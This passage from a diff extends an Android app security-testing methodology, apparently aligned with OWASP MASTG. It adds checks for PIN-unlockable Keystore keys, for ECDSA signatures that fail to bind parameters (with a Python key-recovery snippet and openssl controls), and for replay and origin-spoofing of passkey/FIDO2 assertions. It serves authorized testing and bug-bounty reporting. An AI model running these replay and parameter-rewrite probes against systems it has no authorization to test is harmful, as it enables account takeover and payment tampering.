+| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies) — rate on what the key releases; exit to `broken_authentication_and_session_management.authentication_bypass` (P1) only with a demonstrated session or payment |
+| **Attacker** | AM-11 (shoulder-surfed or coerced PIN) |
+| **Applies to** | API 30+ `setUserAuthenticationParameters(timeout, AUTH_DEVICE_CREDENTIAL \| AUTH_BIOMETRIC_STRONG)`; `BiometricPrompt.PromptInfo.setAllowedAuthenticators(… \| DEVICE_CREDENTIAL)` / `setDeviceCredentialAllowed(true)`; the app's own Keystore aliases (D12-004 table non-empty) |
+| **Requires** | biometric, device |
+| **Maps to** | MASTG-TEST-0326, MASTG-BEST-0031, MASTG-DEMO-0089, MASWE-0020 |
+| **Record** | `logs/D12-082.txt`: per alias the `userAuthType` bits (D12-004); the prompt's allowed authenticators; whether a `BIOMETRIC_WEAK` prompt carries a CryptoObject |
+
+- **Skip when:** no auth-bound key exists (every D12-004 row has `userAuthRequired=false`) — D12-048 is then the finding; write `n/a — D12-082: no auth-bound alias (D12-004 <date>)`.
+- **Test:** a key unlockable by the device credential is only as strong as the PIN; a prompt allowing `BIOMETRIC_WEAK` with a CryptoObject throws, so apps that want weak biometrics silently drop the CryptoObject (→ D12-048). D12-048..053 test presence, duration, enrolment and lock state of the binding but never the authenticator class.
+- **How:**
+```bash
+grep -rnE 'setUserAuthenticationParameters|AUTH_DEVICE_CREDENTIAL|setAllowedAuthenticators|setDeviceCredentialAllowed|BIOMETRIC_WEAK' $DEC/jadx/sources -B4 -A4
+```
+  Read `userAuthType` from the D12-004 table (API 30+: 1 = DEVICE_CREDENTIAL, 2 = BIOMETRIC_STRONG, 3 = either). At runtime, on the prompt choose "Use PIN" and observe whether the key operation completes.
+- **Proof:** `userAuthType` with bit 1 set on the signing/decrypt alias, and the protected operation completing after a PIN entry with the biometric declined — set beside the vendor's UX text that claims biometric protection.
+- **Escalation:** → D13; combine with D12-081 (window) and D12-048 (no binding).
+- **Ruled out when:** `userAuthType=2` on every sensitive alias and the prompt allows only `BIOMETRIC_STRONG`; or the vendor's own threat model states the device credential is equivalent — then it is a hardening note.
+
+### D12-083 · A server- or SDK-issued signature that does not bind the parameters it is named for — the common-key recovery differential
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies); exit via the parameter you can rewrite (the D15 IDOR nodes, D23) |
+| **Attacker** | AM-01 |
+| **Applies to** | apps that receive a signed artefact (payment token, step-up receipt, attestation receipt, entitlement) and present it to a second party |
+| **Requires** | backend-api, mitm |
+| **Maps to** | MASWE-0009; FIPS 186-5 §6.4 (ECDSA public-key recovery); cross-ref D23 (step-up binding, hand-off) |
+| **Record** | `logs/D12-083.txt`: the artefact's field list, the two captures, the candidate message encodings tried, the recovered public key(s), the openssl control outputs |
+
+- **Skip when:** the app forwards no signed artefact (the issuer verifies only what it never hands back) — write `n/a — D12-083: no signed artefact presented to a second party (endpoints.csv <date>)`.
+- **Test:** offline and zero-risk. Capture two artefacts A and B that differ in a parameter P the signature should bind. Recover the ECDSA public-key candidates from each (signature + candidate message hash); a key common to both proves the encoding, and if that encoding excludes P, the signature does not bind P. D12-041 tests only whether the server enforces the app's signature and D12-042 only the client verifier; neither asks what the signature covers.
+- **How:**
+```bash
+# 1. capture A and B (same flow, P differs); 2. enumerate candidate signed messages: full JSON, canonical subset, bytes preceding the signature field
+python3 - <<'PY'
+from ecdsa import VerifyingKey, NIST256p, util; from hashlib import sha256   # pip install ecdsa
+def cands(msg, der): r, s = util.sigdecode_der(der, NIST256p.order); return {k.to_string().hex() for k in VerifyingKey.from_public_key_recovery_with_digest(util.sigencode_string(r, s, NIST256p.order), sha256(msg).digest(), NIST256p)}
+print('common key:', cands(msgA, sigA) & cands(msgB, sigB))
+PY
+# 3. controls with the recovered key written as pub.pem
+openssl dgst -sha256 -verify pub.pem -signature sigA.der msgA.bin                  # Verified OK
+openssl dgst -sha256 -verify pub.pem -signature sigA.der msgA_with_P_changed.bin   # must FAIL if P is bound
+```
+- **Proof:** one key common to A and B, verifying the P-stripped encoding and failing the P-included one (P is outside the signed bytes), then the consumer accepting artefact A with P rewritten — bodies diffed.
+- **Escalation:** → D23 (amount/account rewrite), D15, D21 (an attestation receipt reused across devices).
+- **Ruled out when:** the common key verifies only an encoding that includes P, and a P-modified artefact is rejected with a distinct body.
+
+### D12-084 · Passkey / FIDO2 assertion accepted without challenge freshness, origin or app-identity binding
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
+| **Attacker** | AM-01 (replay) / AM-02 (another app on the device using the same rpId) |
+| **Applies to** | apps using `androidx.credentials` `CreatePublicKeyCredentialRequest` / `GetCredentialRequest` + `GetPublicKeyCredentialOption`, or the legacy `Fido2ApiClient` |
+| **Requires** | backend-api, mitm, device |
+| **Maps to** | `developer.android.com/identity/sign-in/credential-manager`; WebAuthn Level 3 §7.2 (verifying an authentication assertion); assetlinks `delegate_permission/common.get_login_creds` |
+| **Record** | `logs/D12-084.txt`: challenge source and length; `clientDataJSON.origin` (`android:apk-key-hash:<b64>`); the server's response body to each of the four probes |
+
+- **Skip when:** no passkey/FIDO API in `$DEC` (the probe's `PublicKeyCredential|Fido2ApiClient` row is 0) and no WebAuthn endpoints in `inventory/endpoints.csv` — write `n/a — D12-084: no passkey API or WebAuthn endpoint (probe <date>)`.
+- **Test:** the verifier must check that the challenge is server-issued, single-use and fresh; that `clientDataJSON.origin` is the expected `android:apk-key-hash:` (or an allow-listed web origin); that `rpIdHash` matches; and that `signCount` does not regress. Each missing check is a replay or a cross-app relay — the 2026 equivalent of the JWT battery (D12-044..047), which stops at JWT and PKCE.
+- **How:** `grep -rnE 'CreatePublicKeyCredentialRequest|GetPublicKeyCredentialOption|Fido2ApiClient|PublicKeyCredential|clientDataJSON|rpId' $DEC/jadx/sources`; capture one registration and two authentications; probes: (1) replay assertion #1 verbatim; (2) resubmit assertion #2 under a challenge issued to a different session; (3) rewrite `origin` inside `clientDataJSON` (the signature must now fail — confirms the signature is checked at all); (4) if assetlinks lists a second package for the rpId, generate an assertion from an app signed with a different key and check whether the server distinguishes origins.
+- **Proof:** a replayed or stale-challenge assertion returning a session (bodies diffed), or an assertion with a foreign `apk-key-hash` accepted.
+- **Escalation:** → D13 ATO; → D02 (over-broad `get_login_creds` in assetlinks).
+- **Ruled out when:** replay and stale challenge return distinct rejection bodies, origin is pinned to the expected apk-key-hash, and signCount regression is rejected.
 
 ## Graveyard for this domain
 
@@ -2992,7 +3226,7 @@ adb shell dumpsys window | grep -oE 'isKeyguardShowing=(true|false)'
   phone sits unattended on a desk. Two device states in which the standard recommendations silently do
   nothing (D12-052, D12-053).
 - **D12 crypto census × D19 framework detection.** The single largest false-negative generator in this
-  domain is a clean `jadx/sources` crypto grep on a React Native or Flutter app. The framework reviewer
+  domain is a clean `$DEC/jadx/sources` crypto grep on a React Native or Flutter app. The framework reviewer
   knows the app is RN; the crypto reviewer records "no crypto misuse found". Joined, the same grep over the
   Hermes string table or the blutter object-pool dump returns the key, the storage-key names and the route
   table (D12-003).
@@ -3009,7 +3243,8 @@ adb shell dumpsys window | grep -oE 'isKeyguardShowing=(true|false)'
 ## Sources
 
 - **OWASP MASTG / MASVS / MASWE**: MASTG-TEST-0204, -0205, -0208, -0212, -0221, -0232, -0307, -0308, -0312,
-  -0330, -0350; MASTG-KNOW-0011/-0012/-0013/-0043/-0047; MASTG-BEST-0001/-0005/-0009/-0020; MASTG-TECH-0033/-0043;
+  -0326, -0327, -0328, -0330, -0350 (MASTG-TEST-0018 is deprecated); MASTG-KNOW-0011/-0012/-0013/-0038/-0043/-0044/-0045/-0047;
+  MASTG-BEST-0001/-0005/-0009/-0020/-0031/-0036/-0037; MASTG-DEMO-0027/-0058/-0089/-0106; MASTG-TECH-0033/-0043;
   MASTG-TOOL-0032/-0110/-0116/-0125/-0144; MASWE-0003, -0004, -0007, -0008, -0009, -0012, -0013, -0014,
   -0016, -0020, -0022, -0023, -0047; the `mastg-android-*` semgrep rule pack; the noted MASTG gaps (no
   Android test covers KDF misuse or MAC misuse).
